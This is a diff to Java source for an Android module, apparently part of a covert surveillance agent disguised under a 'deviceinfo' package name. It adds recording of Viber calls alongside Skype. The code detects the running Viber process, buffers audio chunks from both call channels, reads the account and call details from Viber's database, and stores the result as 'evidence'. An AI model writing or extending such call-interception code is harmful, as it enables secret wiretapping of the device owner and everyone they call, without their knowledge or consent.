@@ -13,6 +13,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FilenameFilter;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
@@ -46,6 +47,7 @@ import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.listener.ListenerProcess;
 import com.android.deviceinfo.module.chat.CallInfo;
 import com.android.deviceinfo.module.chat.ChatSkype;
+import com.android.deviceinfo.module.chat.ChatViber;
 import com.android.deviceinfo.util.AudioEncoder;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.CallBack;
@@ -98,6 +100,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
 	private RunningProcesses runningProcesses;
 	private CallInfo callInfo;
+	private List<Chunk> chunks = new ArrayList<Chunk>();
 
 	@Override
 	public boolean parse(ConfModule conf) {
@@ -577,7 +580,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 	}
 
-	private void closeCallEvidence(String peer, String number, boolean incoming, Date dateBegin, Date dateEnd, int programId) {
+	private void closeCallEvidence(String peer, String number, boolean incoming, Date dateBegin, Date dateEnd,
+			int programId) {
 		final byte[] additionaldata = getCallAdditionalData(peer, number, incoming, new DateTime(dateBegin),
 				new DateTime(dateEnd), CHANNEL_LOCAL, programId);
 
@@ -628,7 +632,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		caller = WChar.getBytes(peer);
 
 		final int version = 2008121901; // CALL_LOG_VERSION
-		//final int program = 0x0145; // LOGTYPE_CALL_MOBILE
+		// final int program = 0x0145; // LOGTYPE_CALL_MOBILE
 		final int LOG_AUDIO_CODEC_AMR = 0x1;
 		int channel = channels; // 0 - local, 1 - remote
 		int sampleRate = 8000 | LOG_AUDIO_CODEC_AMR;
@@ -991,24 +995,37 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				remote = 0;
 			}
 
-			if (!updateCallInfo()) {
+			if (!updateCallInfo(callInfo, false)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (encodeChunks): unknown call program");
 				}
 				return;
 			}
+			
+			String caller = callInfo.getCaller();
+			String callee = callInfo.getCallee();
 
-			String peer = callInfo.peer;
-			String myNumber = callInfo.account;
-			// Encode to evidence
-			// TODO add caller/callee phone number and right timestamps
-			saveCallEvidence(peer, myNumber, true, begin, end, encodedFile, false, remote, callInfo.programId);
-
+			if(callInfo.delay){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size());
+				}
+				chunks.add(new Chunk(encodedFile, begin, end, remote));
+			}else{
+				// Encode to evidence
+				// TODO add caller/callee phone number and right timestamps
+				saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, remote, callInfo.programId);
+			}
+			
 			// We have an end of call and it's on both channels
 			if (audioEncoder.isLastCallFinished() && encodedFile.endsWith("-r.tmp.err")) {
 				// After encoding create the end of call marker
-				closeCallEvidence(peer, myNumber, true, begin, end, callInfo.programId);
+				if(callInfo.delay){
+					saveAllEvidences(chunks, begin, end);					
+				}else{
+					closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
+				}
 				callInfo = new CallInfo();
+				chunks = new ArrayList<Chunk>();
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(encodeChunks): end of call reached");
@@ -1026,7 +1043,31 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		audioEncoder.removeRawFile();
 	}
 
-	private boolean updateCallInfo() {
+	private void saveAllEvidences(List<Chunk> chunks, Date begin, Date end) {
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveAllEvidences) chunks: " + chunks.size());
+		}
+		CallInfo callInfo =  new CallInfo();
+		updateCallInfo(callInfo, true);
+		
+		String caller = callInfo.getCaller();
+		String callee = callInfo.getCallee();
+		for (Chunk chunk: chunks){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
+			}
+			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.remote, callInfo.programId);
+			
+		}
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveAllEvidences) saving last chunk");
+		}
+		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
+	}
+
+	private boolean updateCallInfo(CallInfo callInfo, boolean end) {
 		// RunningAppProcessInfo fore = runningProcesses.getForeground();
 		if (callInfo.valid) {
 			return true;
@@ -1035,12 +1076,16 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		ListenerProcess lp = ListenerProcess.self();
 
 		if (lp.isRunning("com.skype.raider")) {
-
+			if (end) {
+				return true;
+			}
 			callInfo.processName = "com.skype.raider";
 			// open DB
 			String account = ChatSkype.readAccount();
 			callInfo.account = account;
 			callInfo.programId = 0x0146;
+			callInfo.delay = false;
+			
 			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
 
 			boolean ret = false;
@@ -1049,6 +1094,33 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			return ret;
+		} else if (lp.isRunning("com.viber.voip")) {
+			boolean ret = false;
+			callInfo.processName = "com.viber.voip";
+			callInfo.delay = true;
+			// open DB
+			callInfo.programId = 0x0148;
+			if (end) {
+				String account = ChatViber.readAccount();
+				callInfo.account = account;
+				GenericSqliteHelper helper = ChatViber.openViberDBHelper();
+
+
+				if (helper != null) {
+					ret = ChatViber.getCurrentCall(helper, callInfo);
+				}
+				
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo) id: " + callInfo.id);
+				}
+			}else{
+				callInfo.account="delay";
+				callInfo.peer="delay";
+				ret = true;
+			}
+
+			return ret;
+
 		}
 		return false;
 	}
